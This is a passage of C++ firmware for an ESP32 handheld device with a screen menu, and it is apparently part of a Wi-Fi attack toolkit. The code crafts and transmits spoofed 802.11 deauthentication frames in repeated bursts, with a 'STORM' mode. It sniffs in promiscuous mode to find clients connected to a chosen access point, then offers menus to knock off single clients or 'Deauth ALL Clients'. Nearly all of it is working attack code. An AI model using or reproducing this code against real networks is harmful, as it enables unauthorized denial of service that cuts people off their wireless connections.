                    esp_wifi_set_channel(current_ap.channel, WIFI_SECOND_CHAN_NONE);
                }
                buildOptimizedDeauthFrame(frames[0], hostMAC, current_ap.bssid, current_ap.bssid, reason, false);
                buildOptimizedDeauthFrame(frames[1], hostMAC, current_ap.bssid, current_ap.bssid, reason, true);
                buildOptimizedDeauthFrame(frames[2], current_ap.bssid, hostMAC, current_ap.bssid, reason, false);
                buildOptimizedDeauthFrame(frames[3], current_ap.bssid, hostMAC, current_ap.bssid, reason, true);
            } else {
                buildOptimizedDeauthFrame(frames[0], hostMAC, targetMAC, targetMAC, reason, false);
                buildOptimizedDeauthFrame(frames[1], hostMAC, targetMAC, targetMAC, reason, true);
                buildOptimizedDeauthFrame(frames[2], targetMAC, hostMAC, targetMAC, reason, false);
                buildOptimizedDeauthFrame(frames[3], targetMAC, hostMAC, targetMAC, reason, true);
            }
            for (int i = 0; i < 4; i++) {
                if (enhanced_mode) {
                    wifiRawTx(WIFI_IF_STA, frames[i], 26);
                } else {
                    send_raw_frame(frames[i], 26);
                }
                total_frames++;
                burst_counter++;
            }
        }
        target_index++;
        if (storm_active) {
            delay(random(1, 3));
        } else {
            delay(random(1, 5));
        }
        if (millis() - start_time > 2000) {
            start_time = millis();
            tft.fillRect(tftWidth - 100, tftHeight - 40, 100, 40, TFT_BLACK);
            tft.drawRightString("Total: " + String(total_frames), tftWidth - 12, tftHeight - 20, 1);
            if (storm_active) {
                tft.drawRightString("STORM", tftWidth - 12, tftHeight - 56, 1);
            }
        }
    }
    if (enhanced_mode) {
        esp_wifi_set_promiscuous(false);
    }
    wifiDisconnect();
    WiFi.mode(WIFI_STA);
    delay(500);
    tft.fillRect(0, tftHeight - 60, tftWidth, 60, TFT_BLACK);
    padprintln("Attack stopped.");
    padprintln("Frames sent: " + String(total_frames));
    delay(1000);
}

void showAPSelectionForClientDeauth() {
    WiFiState savedState = saveWiFiState();
    drawMainBorderWithTitle("Select AP");
    
    displayTextLine("Scanning for networks...");
    int n = WiFi.scanNetworks(false, false);
    if (n == 0) {
        displayError("No networks found", true);
        return;
    }
    
    options.clear();
    for (int i = 0; i < n; i++) {
        String ssid = WiFi.SSID(i);
        String bssid = WiFi.BSSIDstr(i);
        int channel = WiFi.channel(i);
        int rssi = WiFi.RSSI(i);
        
        String displayName = ssid.length() > 0 ? ssid : "<Hidden>";
        String optionText = displayName + " (" + String(rssi) + "dBm|ch" + String(channel) + ")";
        
        options.push_back({optionText.c_str(), [=]() {
            uint8_t targetMAC[6];
            memcpy(targetMAC, WiFi.BSSID((uint8_t)i), 6);
            int ch = WiFi.channel((uint8_t)i);
            WiFi.scanDelete();
            
            SelPress = false;
            EscPress = false;
            PrevPress = false;
            NextPress = false;
            delay(100);
            
            scanClientsOnAP(targetMAC, ch);
        }});
    }
    options.push_back({"Back", []() { returnToMenu = true; }});
    
    addOptionToMainMenu();
    loopOptions(options);
}

// Client detection sniffer callback
void clientSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!clientScanActive) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    wifi_header_t* header = (wifi_header_t*)pkt->payload;
    
    if (type == WIFI_PKT_DATA) {
        uint8_t clientMAC[6];
        memcpy(clientMAC, header->addr2, 6);
        
        if (memcmp(header->addr1, scanTargetBSSID, 6) == 0 ||
            memcmp(header->addr3, scanTargetBSSID, 6) == 0) {
            
            bool exists = false;
            for (auto& c : detectedClients) {
                uint8_t existingMAC[6];
                stringToMAC(c.mac.c_str(), existingMAC);
                if (memcmp(existingMAC, clientMAC, 6) == 0) {
                    exists = true;
                    break;
                }
            }
            if (!exists) {
                ip4_addr_t ip;
                ip.addr = 0;
                eth_addr eth;
                memcpy(eth.addr, clientMAC, 6);
                Host client(&ip, &eth);
                detectedClients.push_back(client);
            }
        }
    }
}

void scanClientsOnAP(uint8_t* targetMAC, int channel) {
    WiFiState savedState = saveWiFiState();
    
    drawMainBorderWithTitle("Scanning Clients");
    tft.setTextSize(FP);
    padprintln("Scanning for clients on CH " + String(channel));
    padprintln("");
    padprintln("Press BACK to stop");
    
    detectedClients.clear();
    memcpy(scanTargetBSSID, targetMAC, 6);
    clientScanActive = true;
    
    bool enhanced_mode = tryMonitorMode(channel);
    if (!enhanced_mode) {
        displayError("Failed to enter monitor mode", true);
        clientScanActive = false;
        return;
    }
    
    esp_wifi_set_promiscuous_rx_cb(clientSnifferCallback);
    
    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t frame[26];
    buildOptimizedDeauthFrame(frame, broadcast_mac, targetMAC, targetMAC, 0x07, false);
    
    uint32_t startTime = millis();
    int scanCount = 0;
    
    SelPress = false;
    EscPress = false;
    PrevPress = false;
    NextPress = false;
    delay(100);
    
    while (!check(EscPress) && millis() - startTime < 8000) {
        if (millis() - startTime > scanCount * 1000) {
            wifiRawTx(WIFI_IF_STA, frame, 26);
            scanCount++;
            
            tft.fillRect(0, 80, tftWidth, tftHeight - 100, TFT_BLACK);
            tft.setCursor(10, 80);
            padprintln("Scanning... (" + String(scanCount) + "s)");
            padprintln("");
            padprintln("Clients found: " + String(detectedClients.size()));
            padprintln("");
            
            String spinner = "|/-\\";
            int idx = (scanCount % 4);
            padprintln("  " + String(spinner[idx]) + " Scanning...");
            padprintln("");
            padprintln("Press BACK to stop");
        }
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }
    
    clientScanActive = false;
    if (enhanced_mode) {
        esp_wifi_set_promiscuous(false);
    }
    esp_wifi_set_promiscuous_rx_cb(NULL);
    
    showClientSelectionForDeauth(detectedClients, targetMAC, channel);
}

void showClientSelectionForDeauth(const std::vector<Host>& clients, uint8_t* targetMAC, int channel) {
    options.clear();
    
    if (!clients.empty()) {
        for (auto& client : clients) {
            String clientMac = client.mac;
            options.push_back({clientMac.c_str(), [=]() {
                stationDeauth(client);
            }});
        }
    }
    
    options.push_back({"Deauth ALL Clients", [=]() {
        runDeauthAll(targetMAC, channel);
    }});
    
    options.push_back({"Rescan", [=]() {
        scanClientsOnAP(targetMAC, channel);
    }});
    
    options.push_back({"Back", []() { returnToMenu = true; }});
    
    addOptionToMainMenu();
    loopOptions(options);
}

void deauthTargetListMenu() {
    showAPSelectionForClientDeauth();
}

void showTargetSelection() {
    drawMainBorderWithTitle("Select Target");
    
    displayTextLine("Scanning for networks...");
    
    int n = WiFi.scanNetworks(false, true);
    if (n == 0) {
        displayError("No networks found", true);
        return;
    }
    
    options.clear();
    for (int i = 0; i < n; i++) {
        String ssid = WiFi.SSID(i);
        String bssid = WiFi.BSSIDstr(i);
        int channel = WiFi.channel(i);
        int rssi = WiFi.RSSI(i);
        
        String displayName = ssid.length() > 0 ? ssid : "<Hidden>";
        String optionText = displayName + " (" + String(rssi) + "dBm|ch" + String(channel) + ")";
        
        options.push_back({optionText.c_str(), [=]() {
            uint8_t mac[6];
            sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                   &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
            eth_addr eth;
            memcpy(eth.addr, mac, 6);
            
            ip4_addr_t ip;
            ip.addr = 0;
            
            Host target(&ip, &eth);
            stationDeauth(target);
        }});
    }
    options.push_back({"Back", []() { returnToMenu = true; }});
    
    addOptionToMainMenu();
    loopOptions(options);
}

std::vector<Host> buildTargetListFromScan() {
    std::vector<Host> targets;
    int n = WiFi.scanNetworks(false, true);
    
    for (int i = 0; i < n; i++) {
        String bssid = WiFi.BSSIDstr(i);
        
        uint8_t mac[6];
        sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
        eth_addr eth;
        memcpy(eth.addr, mac, 6);
        
        ip4_addr_t ip;
        ip.addr = 0;
        
        Host host(&ip, &eth);
        targets.push_back(host);
    }
    return targets;
}
